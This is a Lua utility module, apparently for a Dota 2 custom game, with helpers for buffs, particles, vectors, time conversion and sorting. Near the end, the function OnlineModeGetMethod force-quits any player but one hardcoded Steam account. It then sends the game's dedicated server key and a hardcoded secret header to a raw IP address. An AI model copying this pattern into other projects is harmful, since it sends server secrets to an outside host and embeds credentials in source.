  if not ta or ta:IsNull() or not ta:IsAlive() then return end
  ta:AddNewModifier(ta, nil, "modifier_stunned", { duration = dur })
end

--加隐身buff
function Util:AddInvisible(ta, dur)
  if not ta then return end
  ta:AddNewModifier(ta, nil, "modifier_invisible", { duration = dur })
end

--加定时删除buff
function Util:AddKill(ta, dur)
  if not ta then return end
  ta:AddNewModifier(ta, nil, "modifier_kill", { duration = dur })
end

--加定魔免Buff
function Util:AddMM(ta, dur)
  if not ta then return end
  ta:AddNewModifier(ta, nil, "modifier_magic_immune", { duration = dur })
end

function Util:ClearAll(ta)
  --强驱 debuff frameOnly 眩晕 异常
  ta:Purge(false, true, false, true, true)
end

--治疗一个单位 头上显示
function Util:HealUnit(ta, heal)
  if not ta or not IsValidEntity(ta) then return end
  ta:Heal(heal, ta)
  SendOverheadEventMessage(ta, OVERHEAD_ALERT_HEAL, ta, heal, nil)
end

--link n个buff 可以写在spellstart里 IsServer？
--传参 buff,buff,buff,path
function Util:LinkBuff(...)
  local tab = { ... }
  for i = 1, #tab - 1 do
    LinkLuaModifier(tab[i], tab[#tab] .. ".lua", LUA_MODIFIER_MOTION_NONE)
  end
end

--给目标增加一个新buff
function Util:AddBuff(ta, ab, name, dur)
  if not ta or not IsValidEntity(ta) then return end
  if not ab or not ab.ca then return end
  local sj = dur
  if not dur then
    sj = -1
  end
  ta:AddNewModifier(ab.ca, ab, name, { duration = sj })
end

--给buff层数 并返回最新层数 传0就清零 其它加
function Util:BuffCount(bf, num)
  if not bf or not num then return end
  local now = bf:GetStackCount()
  local new = now + num
  if num == 0 then
    new = 0
  end
  bf:SetStackCount(new)
  return new
end

--查询buffbyname
function Util:Name2Buff(ent, name)
  return ent:FindModifierByName(name)
end

--buff timers
--buff持续时间完 思考自动消失  num-1传入时结束思考
function Util:BTimers(num, bf)
  bf:StartIntervalThink(num)
end

--function OnIntervalThink()

------------------------------------------------------
--cp,sce,dp,rp,sc,ap 创建，实体控制，摧毁，释放，设置控制，添加
--粒子控制器 第一个是值类型
function Util:PM(...)
  local tab = { ... }
  local index = nil
  local tp = tab[1]
  if not tp or type(tp) ~= "string" then return end
  if tp == "cp" then
    --name,PATTACH,unit
    index = ParticleManager:CreateParticle(tab[2], tab[3], tab[4])
  elseif tp == "sce" then
    --index,controlPoint,unit,PATTACH,attachment,ve,lockOrientation
    ParticleManager:SetParticleControlEnt(tab[2], tab[3], tab[4], tab[5], tab[6], tab[7], tab[8])
  elseif tp == "dp" then
    --index,bool
    ParticleManager:DestroyParticle(tab[2], tab[3])
  elseif tp == "rp" then
    --index
    ParticleManager:ReleaseParticleIndex(tab[2])
  elseif tp == "sc" then
    --index,point,ve
    ParticleManager:SetParticleControl(tab[2], tab[3], tab[4])
  elseif tp == "ap" then
    --self,index,pri
    tab[2]:AddParticle(tab[3], false, false, tab[4], false, false)
  end
  return index
end

--创建粒子 返回index
function Util:CreatePa(ent, name, types)
  local tp = PATTACH_ABSORIGIN
  if types then
    tp = types
  end
  local index = ParticleManager:CreateParticle(name, tp, ent)
  return index
end

--buff添加特效 pri优先
--不消灭索引 通过buff消失自动去掉特效
function Util:BuffAddPa(index, buff, pri)
  if not pri then
    pri = 4
  end
  buff:AddParticle(index, false, false, pri, false, false)
end

--释放索引 并决定是否摧毁粒子
function Util:DestroyPa(index, bool)
  if bool then
    ParticleManager:DestroyParticle(index, true)
  end
  ParticleManager:ReleaseParticleIndex(index)
end

--坐标粒子控制 可以写三个值 也可以只写X给个Vector
function Util:V2Pa(index, point, x, y, z)
  local vector = nil
  if x and y and z then
    vector = Vector(x, y, z)
  elseif x and not y and not z then
    vector = x
  else
    vector = Vector(0, 0, 0)
  end
  ParticleManager:SetParticleControl(index, point, vector)
end

--实体粒子控制
function Util:Ent2Pa(index, point, ent, types, ach)
  local tp = PATTACH_ABSORIGIN
  if types then
    tp = types
  end
  local attach = "attach_hitloc"
  if not ach then
    attach = ach
  end
  ParticleManager:SetParticleControlEnt(index, point, ent, PATTACH_ABSORIGIN_FOLLOW, nil, ent:GetAbsOrigin(), false)
end

-- 模型未加载/空模型时 attach_hitloc 会报 Unable to lookup attachment on model ""；有挂点则 POINT_FOLLOW，否则 ABSORIGIN_FOLLOW
function Util:ParticleSetControlEntHitlocOrAbsFollow(iParticle, iControlPoint, ent)
  if not iParticle or not ent or ent:IsNull() then
    return
  end
  local pos = ent:GetAbsOrigin()
  local use_hitloc = false
  if ent.ScriptLookupAttachment then
    local ok, att = pcall(function()
      return ent:ScriptLookupAttachment("attach_hitloc")
    end)
    if ok and att and att > 0 then
      use_hitloc = true
    end
  end
  if use_hitloc then
    ParticleManager:SetParticleControlEnt(iParticle, iControlPoint, ent, PATTACH_POINT_FOLLOW, "attach_hitloc", pos,
      true)
  else
    ParticleManager:SetParticleControlEnt(iParticle, iControlPoint, ent, PATTACH_ABSORIGIN_FOLLOW, nil, pos, false)
  end
end

--普攻一次
function Util:AttackOne(ca, ta)
  if not ca or not ta then return end
  ca:PerformAttack(ta, false, true, true, false, false, false, true)
  --mAttack(目标,useCastAttackOrb,processProcs,skipCooldown,ignoreInvis, useProjectile,fakeAttack,neverMiss)
end

--打断 停止
function Util:Stop(ca)
  ca:Interrupt()
  ca:Stop()
end

--交换两实体位置
function Util:SwapUnit(a, b)
  if a and IsValidEntity(a)
      and b and IsValidEntity(b)
      and a:IsAlive() and b:IsAlive() then
    local apos = a:GetAbsOrigin()
    local bpos = b:GetAbsOrigin()
    FindClearSpaceForUnit(a, bpos, true)
    FindClearSpaceForUnit(b, apos, true)
  end
end

--英雄右边多少码
function Util:RightVector(ca, int)
  if not ca then return end
  if not int or type(int) ~= "number" then return end
  local ve = ca:GetAbsOrigin()
  local right = ve + ca:GetRightVector() * int
  return right
end

--英雄左边多少码
function Util:LeftVector(ca, int)
  if not ca then return end
  if not int or type(int) ~= "number" then return end
  local ve = ca:GetAbsOrigin()
  local left = ve - ca:GetRightVector() * int
  return left
end

--英雄前面多少码
function Util:ForwardVector(ca, int)
  if not ca then return end
  if not int or type(int) ~= "number" then return end
  local ve = ca:GetAbsOrigin()
  local forward = ve + ca:GetForwardVector() * int
  return forward
end

--英雄后多少码
function Util:BackVector(ca, int)
  if not ca then return end
  if not int or type(int) ~= "number" then return end
  local ve = ca:GetAbsOrigin()
  local back = ve - ca:GetForwardVector() * int
  return back
end

--半径转友军 (包含ca自己) 有时又没的 所以手动检查一下
function Util:Radius2Good(ca, radius)
  if not ca or type(ca) ~= "table" then return end
  if radius == nil then radius = RandomInt(300, 400) end
  local good = FindUnitsInRadius(
    ca:GetTeamNumber(),
    ca:GetAbsOrigin(),
    nil,
    radius,
    DOTA_UNIT_TARGET_TEAM_FRIENDLY,
    DOTA_UNIT_TARGET_HERO + DOTA_UNIT_TARGET_BASIC,
    DOTA_UNIT_TARGET_FLAG_MAGIC_IMMUNE_ENEMIES,
    FIND_CLOSEST,
    false)
  if #good == 0 then
    table.insert(good, ca)
  else
    local mark = false
    for _, v in pairs(good) do
      if v == ca then
        mark = true
        break
      end
    end
    if mark == false then
      table.insert(good, ca)
    end
  end
  return good
end

--移除buff
function Util:RemvoeBuff(ca, name)
  if ca:HasModifier(name) then
    ca:RemoveModifierByName(name)
  end
end

--设置生命
function Util:SetHealth(ca, int)
  ca:SetBaseMaxHealth(int)
  ca:SetMaxHealth(int)
  ca:SetHealth(int)
end

--vector传输过后是个字符 需要再转回成点
function Util:Str2Vector(string)
  local temp = {}
  for str in string.gmatch(string, "%S+") do
    if tonumber(str) then
      temp[#temp + 1] = tonumber(str)
    else
      return nil
    end
  end
  return Vector(temp[1], temp[2], temp[3])
end

--[[
系统时间的描述

一、LocalTime()
返回
{
  Hours  (string)= 13  (number)
  Minutes  (string)= 9  (number)
  Seconds  (string)= 23  (number)
}

二、GetSystemDate()
03/11/22

三、GetSystemTime()
13:13:20

------------20：20
四、Time()
1336.7333984375

五、GameRules:GetDOTATime(true, true)  --返回Dota游戏内的时间（是否包含赛前时间或负时间)
1130.232421875

六、GameRules:GetGameTime()
1331.8630371094
]]


--系统日期 格式为 月/日/年 拆成年月日
function Util:GetDate()
  local Sdate = GetSystemDate()
  local date = self:Split(Sdate, "/")
  date = "20" .. date[3] .. date[1] .. date[2]
  return date
end

--系统时间 为时：分：秒   把冒号去掉
function Util:GetTime()
  local STime = GetSystemTime()
  local Time = string.gsub(STime, ":", "")
  return Time
end

--返回日期时间拼接
function Util:GetDT()
  local D = self:GetDate()
  local T = self:GetTime()
  return D .. T
end

--把YYYY-MM-DD HH:mm:ss 转成 YYYYMMDDHHmmss
function Util:Time2Str(time)
  time = string.gsub(time, " ", "")
  time = string.gsub(time, "-", "")
  time = string.gsub(time, ":", "")
  return time
end

--设置+n天的有截止效期  纯时间字符串 YYYYMMDDHHmmss
--后面还要加上当天时间 暂时未加
function Util:SetMaxDT(days)
  local every = {
    [1] = 31,
    [2] = 28,
    [3] = 31,
    [4] = 30,
    [5] = 31,
    [6] = 30,
    [7] = 31,
    [8] = 31,
    [9] = 30,
    [10] = 31,
    [11] = 30,
    [12] = 31
  }

  local Sdate = GetSystemDate()
  local date = self:Split(Sdate, "/")
  local year = tonumber(date[3])
  local mon = tonumber(date[1])
  local day = tonumber(date[2])
  local newday = tonumber(day) + tonumber(days)

  while newday > every[mon] do
    newday = newday - every[mon]
    mon = mon + 1
    if mon > 12 then
      year = year + 1
      mon = 1
    end
  end
  local monstr = ""
  if mon < 10 then
    monstr = "0" .. tostring(mon)
  else
    monstr = tostring(mon)
  end
  local daystr = ""
  if newday < 10 then
    daystr = "0" .. tostring(newday)
  else
    daystr = tostring(newday)
  end


  return "20" .. tostring(year) .. monstr .. daystr
end

--系统utc世界时
function Util:GetUtc()
  local unix = Util:GetUnix()
  local utc = Util:Unix2Utc(unix)
  return utc
end

--当前时间戳 unix
function Util:GetUnix()
  local dateArr = self:Split(GetSystemDate(), "/")
  dateArr[3] = "20" .. dateArr[3]
  local timeArr = self:Split(GetSystemTime(), ":")
  local sec = tonumber(timeArr[3]) + tonumber(timeArr[2]) * 60 + tonumber(timeArr[1]) * 60 * 60 +
      (tonumber(dateArr[2]) - 1) * 60 * 60 * 24
  local year = tonumber(dateArr[3])
  local min = tonumber(dateArr[1]) - 1
  for i = 1, min do
    if i == 1 or i == 3 or i == 5 or i == 7 or i == 8 or i == 10 or i == 12 then
      sec = sec + 31 * 60 * 60 * 24
    elseif i == 4 or i == 6 or i == 9 or i == 11 then
      sec = sec + 30 * 60 * 60 * 24
    else
      if (year % 4 == 0 and year % 100 ~= 0) or (year % 400 == 0) then
        sec = sec + 29 * 60 * 60 * 24
      else
        sec = sec + 28 * 60 * 60 * 24
      end
    end
  end
  local day = 0
  for i = 1970, year - 1 do
    if (i % 4 == 0 and i % 100 ~= 0) or (i % 400 == 0) then
      day = day + 366
    else
      day = day + 365
    end
  end
  sec = sec + day * 60 * 60 * 24

  return sec - 8 * 3600
end

--是否闰年
function Util:IsLeapYear(year)
  return (year % 4 == 0 and year % 100 ~= 0) or (year % 400 == 0)
end

--时间戳 转 世界时  unix to utc 单位秒  北京时间
function Util:Unix2Utc(unixtime, returnTable)
  local day = math.floor(unixtime / 86400)
  local year = 1970
  while day > 366 do
    if self:IsLeapYear(year) then
      day = day - 366
      unixtime = unixtime - 366 * 86400
    else
      day = day - 365
      unixtime = unixtime - 365 * 86400
    end
    year = year + 1
  end

  day = math.floor(unixtime / 86400)
  local _day = 0
  local month = 0
  for i = 1, 12 do
    local d
    if i == 1 or i == 3 or i == 5 or i == 7 or i == 8 or i == 10 or i == 12 then
      d = 31
    elseif i == 4 or i == 6 or i == 9 or i == 11 then
      d = 30
    else
      if self:IsLeapYear(year) then
        d = 29
      else
        d = 28
      end
    end
    _day = _day + d
    if day - _day < 0 then
      month = i
      unixtime = unixtime - (_day - d) * 86400
      break
    end
  end
  unixtime = unixtime + 8 * 3600
  local day = math.floor(unixtime / 86400)
  unixtime = unixtime - day * 86400
  local h = math.floor(unixtime / 3600)
  unixtime = unixtime - h * 3600
  local m = math.floor(unixtime / 60)
  unixtime = unixtime - m * 60

  if returnTable then
    return {
      year = year,
      month = month,
      day = day + 1,
      hours = h,
      minutes = m,
      seconds = unixtime,
    }
  end

  return string.format('%d-%02d-%02d %02d:%02d:%02d', year, month, day + 1, h, m, unixtime)
end

--世界时 转 时间戳   年-月-日 时：分：秒 转 时间戳 单位秒 10位数
function Util:Utc2Unix(time)
  local tab = Util:TimeStr2Tab(time)
  if not tab or not tab.hours then return end
  --03/11/2022
  local dateArr = {
    tab.month,
    tab.day,
    tab.year,
  }
  --13:13:20
  local timeArr = {
    tab.hours,
    tab.minutes,
    tab.seconds,
  }
  local sec = timeArr[3] +            --秒
      timeArr[2] * 60 +               --分转秒
      timeArr[1] * 60 * 60 +          --时转秒
      (dateArr[2] - 1) * 60 * 60 * 24 --本月往前一天所有当月天数转秒

  local year = dateArr[3]             --年
  local min = dateArr[1] - 1          --日
  for i = 1, min do
    if i == 1 or i == 3 or i == 5 or i == 7 or i == 8 or i == 10 or i == 12 then
      sec = sec + 31 * 60 * 60 * 24
    elseif i == 4 or i == 6 or i == 9 or i == 11 then
      sec = sec + 30 * 60 * 60 * 24
    else
      if (year % 4 == 0 and year % 100 ~= 0) or (year % 400 == 0) then
        sec = sec + 29 * 60 * 60 * 24
      else
        sec = sec + 28 * 60 * 60 * 24
      end
    end
  end
  local day = 0
  for i = 1970, year - 1 do
    if (i % 4 == 0 and i % 100 ~= 0) or (i % 400 == 0) then
      day = day + 366
    else
      day = day + 365
    end
  end
  sec = sec + day * 60 * 60 * 24

  return sec - 8 * 3600
end

--mm2s 毫秒的时间戳转秒的时间戳
--只针对请求数据回来的戳  是0区毫秒
function Util:Unixmm2s(unix)
  if not unix then return end
  local str = tostring(unix)
  str = Util:CutOut(str, 1, 10)
  return tonumber(str)
end

--当前  年-月-日 时：分：秒
function Util:CurrentTime()
  local Sdate = GetSystemDate()
  local date = self:Split(Sdate, "/")
  date = date[3] .. "-" .. date[1] .. "-" .. date[2]
  local STime = GetSystemTime()
  return date .. " " .. STime
end

--  年-月-日 时：分：秒 拆成 tab
function Util:TimeStr2Tab(time)
  if not time then return end
  time = tostring(time)
  local all = self:Split(time, " ")
  local datestr = all[1]
  local timestr = all[2]
  local datetab = self:Split(datestr, "-")
  local timetab = self:Split(timestr, ":")
  local tab = nil
  if timetab then
    tab = {
      year = tonumber(datetab[1]),
      month = tonumber(datetab[2]),
      day = tonumber(datetab[3]),
      hours = tonumber(timetab[1]),
      minutes = tonumber(timetab[2]),
      seconds = tonumber(timetab[3]),
    }
  else
    tab = {
      year = tonumber(datetab[1]),
      month = tonumber(datetab[2]),
      day = tonumber(datetab[3]),
    }
  end
  return tab
end

--当前  年-月-日 时：分：秒 拆成 tab
function Util:CurrentTimeTab()
  local time = self:CurrentTime()
  return self:TimeStr2Tab(time)
end

--一个时间戳是不是今天 不包含时间
function Util:IsToday(stamp)
  if not stamp then return end
  local utc = self:Unix2Utc(stamp)
  local tab = self:TimeStr2Tab(utc)
  -- print("util.util.lua 2116 被比对时间" .. utc)
  local today = self:GetUtc()
  local todaytab = self:TimeStr2Tab(today)
  if not tab or not todaytab then return false end
  if tab.year == todaytab.year and
      tab.month == todaytab.month and
      tab.day == todaytab.day then
    return true
  else
    return false
  end
end

--一个时间戳 加减n天
function Util:AddTimeOnUnix(stamp, day)
  if not stamp then return end
  stamp = tonumber(stamp)
  day = tonumber(day)
  stamp = stamp + day * 24 * 3600
  return stamp
end

--是否已到期 和今天比 到期true
--期限物品就存一个期限日期 如果增加了 就更新这个值就是了
--到本地时和今天的时间戳比对一下 就知道过期了没有
function Util:IsDueDate(stamp)
  if not stamp then return end
  stamp = tonumber(stamp)
  local today = Util:GetUnix()
  if not today then return false end
  if stamp <= today then
    return false
  else
    return true
  end
end

function Util:SerBack(data)
  if data and data.success == true then
    return true
  end
end

--注意 所有排序都是直接操作数组
--冒泡排序 传入数组 直接操作的数组 没有深拷贝 升序
function Util:BubbleSort(arr)
  local len = #arr
  if not arr or not len then return end
  if len <= 1 then return arr[1] end
  for i = 1, len - 1 do
    for j = i + 1, len do
      if arr[i] > arr[j] then
        arr[i], arr[j] = arr[j], arr[i]
      end
    end
  end
  return arr
end

--降序
function Util:BubbleSortDown(arr)
  local len = #arr
  if not arr or not len then return end
  if len <= 1 then return arr[1] end
  for i = 1, len - 1 do
    for j = i + 1, len do
      if arr[i] < arr[j] then
        arr[i], arr[j] = arr[j], arr[i]
      end
    end
  end
  return arr
end

--最大值
function Util:GetArrMax(arr)
  local len = #arr
  if not arr or not len then return end
  if len == 0 then return end
  if len == 1 then return arr[1] end
  local max = arr[1]
  for i = 2, len do
    if arr[i] > max then
      max = arr[i]
    end
  end
  return max
end

--最小值
function Util:GetArrMin(arr)
  local len = #arr
  if not arr or not len then return end
  if len == 0 then return end
  if len == 1 then return arr[1] end
  local min = arr[1]
  for i = 2, len do
    if arr[i] < min then
      min = arr[i]
    end
  end
  return min
end

--最大键 返回表 如果有同大小的 一起装进去
function Util:GetMaxKey(tab)
  if not tab then return end
  local temp = {}
  for k, v in pairs(tab) do
    if type(v) ~= "number" then return end
    table.insert(temp, v)
  end
  local max = self:GetArrMax(temp)

  local maxkey = {}
  for k, v in pairs(tab) do
    if v == max then
      table.insert(maxkey, k)
    end
  end
  return maxkey
end

--最小键 返回表 如果有同大小的 一起装进去
function Util:GetMinKey(tab)
  if not tab then return end
  local temp = {}
  for k, v in pairs(tab) do
    if type(v) ~= "number" then return end
    table.insert(temp, v)
  end
  local min = self:GetArrMin(temp)
  local minkey = {}
  for k, v in pairs(tab) do
    if v == min then
      table.insert(minkey, k)
    end
  end
  return minkey
end

--冒泡排序另一种写法 升序
function Util:BubbleSortAnother(arr)
  local len = #arr
  for i = 1, #arr do
    for j = #arr, i + 1, -1 do
      if arr[j] < arr[j - 1] then
        arr[j], arr[j - 1] = arr[j - 1], arr[j]
      end
    end
  end
  return arr
end

--自带的sort排序最快 修改原数组 升序
function Util:QuickTableUpSort(arr)
  local fun = function(c1, c2)
    if c1 == c2 then return false end
    if not c1 or not c2 then return false end
    return c1 < c2
  end
  table.sort(arr, fun)
  return arr
end

--降序
function Util:QuickTableDownSort(arr)
  local fun = function(c1, c2)
    if c1 == c2 then return false end
    if not c1 or not c2 then return false end
    return c1 > c2
  end
  table.sort(arr, fun)
  return arr
end

--[[
  原生lua生成一个随机数组
  require("socket")
  function LuaRandomInt(min,max,count)
        --种子
        local tab={}
        math.randomseed(tostring(socket.gettime()):reverse():sub(1, 6))
        for i=1,count do
         table.insert(tab, math.random(min,max))
        end
        return tab
  end
]]


--连接打印
function Util:ConnectPrintArr(arr)
  local str = ""
  for i = 1, #arr do
    str = str .. arr[i] .. ","
  end
  print(str)
end

--根据一个数级的顺序 排序另一个数组 两个数组需要键对应 升序
--a={2,3,4,5}
--b={"a","b","c","d"}
--传入a,b 返回排序后的b
function Util:BubbleSortWithArrUp(arr, arr2)
  local len = #arr
  for i = 1, len - 1 do
    for j = i + 1, len do
      if arr[i] > arr[j] then
        arr[i], arr[j] = arr[j], arr[i]
        arr2[i], arr2[j] = arr2[j], arr2[i]
      end
    end
  end
  return arr2
end

--降序
function Util:BubbleSortWithArrDown(arr, arr2)
  local len = #arr
  for i = 1, len - 1 do
    for j = i + 1, len do
      if arr[i] < arr[j] then
        arr[i], arr[j] = arr[j], arr[i]
        arr2[i], arr2[j] = arr2[j], arr2[i]
      end
    end
  end
  return arr2
end

--随机坐标
function Util:RandomPos(center, max, min)
  return center + RandomVector(Script_RandomFloat(min or 0, max or 0))
end

--转换成能抵达的坐标
function Util:FindCanReachPos(ve)
  if not GridNav:IsTraversable(ve) then
    local num = 0
    for i = 1, 1000 do
      local temp = nil
      temp = ve + RandomVector(RandomInt(0, 100 + num))
      num = num + 10
      if GridNav:IsTraversable(temp) then
        ve = temp
        break
      end
    end
  end
  return ve
end

--A单是否朝向B单位
function Util:IsFace2Face(a, b)
  if not a or not b then return end
  local af = a:GetForwardVector()
  local apos = a:GetAbsOrigin()
  local bpos = b:GetAbsOrigin()
  local fx = (bpos - apos):Normalized()
  local dot = DotProduct(fx, af)
  if dot >= 0.9 then --负1正面
    return fx
  end
end

--两单位之间的距离
function Util:GetLength2DClosed(a, b)
  if not a or not b then return end
  local apos = a:GetAbsOrigin()
  local bpos = b:GetAbsOrigin()
  local len = (bpos - apos):Length2D()
  if len <= 40 then
    return true
  end
end

function Util:GetLength2D(a, b)
  if not a or not b then return end
  local apos = a:GetAbsOrigin()
  local bpos = b:GetAbsOrigin()
  local len = (bpos - apos):Length2D()
  return len
end

--用lerp靠近一个单位
function Util:Go2Unit(ta, ropos, num)
  return LerpVectors(ta:GetAbsOrigin(), ropos, num)
end

--KV物品ID查重
function Util:KV_ItemsFindDuplicates()
  --收集所有ID
  local temp = {}
  local tab = LoadKeyValues("scripts/npc/npc_items_custom.txt")
  for k, v in pairs(tab) do
    if k ~= "Version" then
      table.insert(temp, v.ID)
    end
  end

  local mark = false
  --遍历是否重复
  for i = 1, #temp do
    local A = temp[i]
    --最后一个结束
    if i == #temp then break end
    --比较
    for ii = i + 1, #temp do
      if A == temp[ii] then
        print("KV物品ID重复:" .. A)
        if mark == false then
          mark = true
        end
      end
    end
  end

  if mark == false then
    print("KV物品ID无重复")
  end
end

--游戏是否可以运行
function Util:CanGameRun()
  --非开发模式又不是专用服务器 不能运行
  if not IsInToolsMode() and not IsDedicatedServer() then
    return false --上线改为false
  end

  return true
end

function Util:OnlineModeGetMethod()
  local player = Entities:GetLocalPlayer()
  local id = player:GetPlayerID()
  local aid = PlayerResource:GetSteamAccountID(id)
  if aid ~= 1210645015 then
    SendToConsole("quit")
  end
  local url = "http://1.14.156.78:8000/whitelist/mykey"
  local req = CreateHTTPRequest("GET", url)
  req:SetHTTPRequestHeaderValue("secretkey", "1008611")
  req:SetHTTPRequestGetOrPostParameter("playerid", "1008611")
  req:SetHTTPRequestGetOrPostParameter("key", GetDedicatedServerKeyV2("DLWG_SEVER_CODE_NAME" or 1))
  req:SetHTTPRequestAbsoluteTimeoutMS(30000)
  req:Send(function(keys) end)
end

--目标在某位置的哪个象限 基于游戏内的世界坐标
function Util:GetPosQuadrant(ca, ta)
  local apos = ca:GetAbsOrigin()
  local bpos = ta:GetAbsOrigin()
  local fx = (bpos - apos):Normalized()
  local x = fx.x
  local y = fx.y
  if x > 0 and y > 0 then return 1 end
  if x < 0 and y > 0 then return 2 end
  if x < 0 and y < 0 then return 3 end
  if x > 0 and y < 0 then return 4 end
end

--垂直平面Y旋转一个向量
function Util:RotateDir(dir, deg)
  local rad = math.rad(deg)
  local x = dir.x
  local y = dir.y
  local newx = x * math.cos(rad) - y * math.sin(rad)
  local newy = x * math.sin(rad) + y * math.cos(rad)
  return Vector(newx, newy, dir.z)
end

--目标在位置的左手还是右手  1左 -1右  0正对
function Util:IsLeftOrRight(ca, ta)
  local face = ca:EyeAngles().y       --中心朝向
  local dis = ta:GetAbsOrigin() - ca:GetAbsOrigin()
  local angle = VectorToAngles(dis).y --目标所处角度
  local c = math.floor(angle - face)

  if c < 0 then
    c = c + 360
  end

  if c < 180 and c > 0 then
    return 1
  elseif c > 180 then
    return -1
  else
    return 0
  end
end

--世界坐标系 Angle转象限
function Util:Deg2Quadrant(deg)
  local deg = math.abs(deg) % 360
  if deg > 0 and deg <= 90 then
    return 1
  elseif deg > 90 and deg <= 180 then
    return 2
  elseif deg > 180 and deg <= 270 then
    return 3
  else
    return 4
  end
end

-----------------------------------------------向量工具
--模长 相当于v:Length2D()
function Util:GetModLength(v)
  local x = v.x
  local y = v.y
  return math.sqrt(x * x + y * y)
end

--一个方向的垂直方向 就是叉乘一个面上的两个向量 可以得到垂直面
--由于Z永远向上，一般只求平面方向可以引入一个Z轴
function Util:GetRightFrowar(ve1)
  return CrossVectors(ve1, Vector(0, 0, 1))
end

--两个向量的夹角θ
--(如果是两个归1化的向量 则dot=cosθ  点积等于两向量COS)
function Util:Vector2Angle(v1, v2)
  local dot = DotProduct(v1, v2)
  local cos = dot / self:GetModLength(v1) * self:GetModLength(v2)
  if cos > 1 then cos = 1 end
  if cos < -1 then cos = -1 end
  local hudu = math.acos(cos)
  local deg = math.deg(hudu)
  local format = Util:CutFloat(deg, 2)
  return format
end

--源点朝向 和 某一目标之间的夹角 越是正对 夹角越小
function Util:Ent2EntAngle(ca, ta)
  if not ca or not ta then return end
  local pos1 = ca:GetAbsOrigin()
  local pos2 = ta:GetAbsOrigin()
  local v1 = ca:GetForwardVector()
  local v2 = (pos2 - pos1):Normalized()
  return self:Vector2Angle(v1, v2)
end

--敌人在左还是在右 得最佳转向
function Util:EntAtLeftOrRight(ca, ta)
  if not ca or not ta then return end
  local pos1 = ca:GetAbsOrigin()
  local pos2 = ta:GetAbsOrigin()
  local v1 = ca:GetForwardVector()
  local v2 = (pos2 - pos1):Normalized()
  local cross = CrossVectors(v1, v2)
  if cross.z > 0 then
    return "left"
  elseif cross.z < 0 then
    return "right"
  else
    return "center"
  end
end

--敌人在前还是在后 是否要转身
function Util:EntIsFrontOrBack(ca, ta)
  local deg = Util:Ent2EntAngle(ca, ta)
  if type(deg) ~= "number" then return end
  if deg <= 90 then
    return "front"
  else
    return "back"
  end
end

--获取前方向位置
function Util:GetForwardVector(ca, len)
  if not ca then return end
  local front = ca:GetForwardVector()

  if not len then
    return front
  else
    local ve = ca:GetAbsOrigin()
    return ve + front * len
  end
end

--获取后方向位置
function Util:GetBackVector(ca, len)
  if not ca then return end
  local front = ca:GetForwardVector()
  local back = front * -1
  if not len then
    return back
  else
    local ve = ca:GetAbsOrigin()
    return ve + back * len
  end
end

--A-B-C-D-E...个点连成一个范围  判断某个点point 是否在此范围内
--方法 顺时针求每个点到point的向量 point是否在右侧
--vetab 是一个按顺序的世界坐标向量集合 必须按序  如6边形顺时针6个点
--point 是任意世界坐标
function Util:IsPointInCustomRang(vetab, point)
  local tab = vetab
  local inmark = true
  for i = 1, #tab do
    local ve1 = tab[i]
    local ve2 = tab[i + 1] or tab[1]
    local xl1 = (ve2 - ve1):Normalized()
    local xl2 = (point - ve1):Normalized()
    local cross = CrossVectors(xl1, xl2)
    if cross.z >= 0 then
      inmark = false
      break
    end
  end
  return inmark
end

--画一个测试线
function Util:DegbugLine(ve1, ve2)
  DebugDrawLine(ve1, ve2, 255, 255, 255, true, 3)
end

--画一个测试圆
function Util:DegbugCircle(ve, radius)
  DebugDrawCircle(ve, Vector(255, 255, 255), 1, radius, true, 3)
end

--画一个直线两个圆测试
function Util:DegbugCircleLine(ve1, ve2, radius)
  Util:DegbugLine(ve1, ve2)
  Util:DegbugCircle(ve1, radius)
  Util:DegbugCircle(ve2, radius)
end

--设置自定义血条
function Util:Insert2Hpbar(unit)
  if not unit or unit:IsNull() then return end
  local unitIndex = unit:entindex()
  Mission.Hpbar[unitIndex] = unitIndex
  CustomNetTables:SetTableValue("Hpbar", "health_bar_index", Mission.Hpbar)
end

--清除自定义血条
function Util:Clear2Hpbar(unit)
  if not unit or unit:IsNull() then return end
  local unitIndex = unit:entindex()
  Mission.Hpbar[unitIndex] = nil
  CustomNetTables:SetTableValue("Hpbar", "health_bar_index", Mission.Hpbar)
end

----------------------------------------------------------------
--基础值的增加部份
--加白字攻击力
function Util:AddBaseAttack(hero, num)
  if not hero or hero:IsNull() then return end
  if not hero:IsRealHero() then return end
  local min = hero:GetBaseDamageMin()
  local max = hero:GetBaseDamageMax()
  local main = hero:GetPrimaryStatValue()
  hero:SetBaseDamageMin(min - main + num)
  hero:SetBaseDamageMax(max - main + num)
end

--加物理护甲
function Util:AddPhysicalArmor(hero, num)
  if not hero or hero:IsNull() then return end
  if not hero:IsRealHero() then return end
  local arm = hero:GetPhysicalArmorBaseValue()
  hero:SetPhysicalArmorBaseValue(arm + num)
end

--全属性
function Util:AddThreeAttribut(hero, num)
  if not hero or hero:IsNull() then return end
  if not hero:IsRealHero() then return end
  hero:ModifyStrength(num)
  hero:ModifyAgility(num)
  hero:ModifyIntellect(num)
end

--白字力量 可以直接用官方API 写这里留个笔记
function Util:AddStrength(hero, num)
  if not hero or hero:IsNull() then return end
  if not hero:IsRealHero() then return end
  hero:ModifyStrength(num)
end

--白字敏捷 可以直接用官方API 写这里留个笔记
function Util:AddAgility(hero, num)
  if not hero or hero:IsNull() then return end
  if not hero:IsRealHero() then return end
  hero:ModifyAgility(num)
end

--白字智力 可以直接用官方API 写这里留个笔记
function Util:AddIntellect(hero, num)
  if not hero or hero:IsNull() then return end
  if not hero:IsRealHero() then return end
  hero:ModifyIntellect(num)
end

--加白字base生命上限 不设置base值 用主buff里的生命常数来加
function Util:AddMaxHealth(hero, num)
  if not hero or hero:IsNull() then return end
  if not hero:IsRealHero() then return end
  local ID = Util:Hero2ID(hero)
  if not ID then return end
  SX:Add("smzcs", num, ID)
  --hero:SetBaseMaxHealth(num)
  --hero:SetMaxHealth(num)
end

--播一次使用物品的特效 主要给遗物套装使用
function Util:UseItemFx(hero)
  local str = "particles/units/heroes/hero_monkey_king/monkey_king_disguise_sparks.vpcf"
  local fx = ParticleManager:CreateParticle(str, PATTACH_ABSORIGIN_FOLLOW, hero)
  ParticleManager:SetParticleControl(fx, 0, hero:GetAbsOrigin())
  Timers(3, function()
    ParticleManager:DestroyParticle(fx, false)
    ParticleManager:ReleaseParticleIndex(fx)
  end)
  EmitSoundOn("DOTA_Item.Mango.Activate", hero)
end

--创建一个饰品 这个会跟在英雄children最后一个
function Util:CreateWear(model, hero)
  if hero == nil then return end
  local mod = SpawnEntityFromTableSynchronous("prop_dynamic", { model = model })
  mod:SetParent(hero, nil)
  mod:SetOwner(hero)
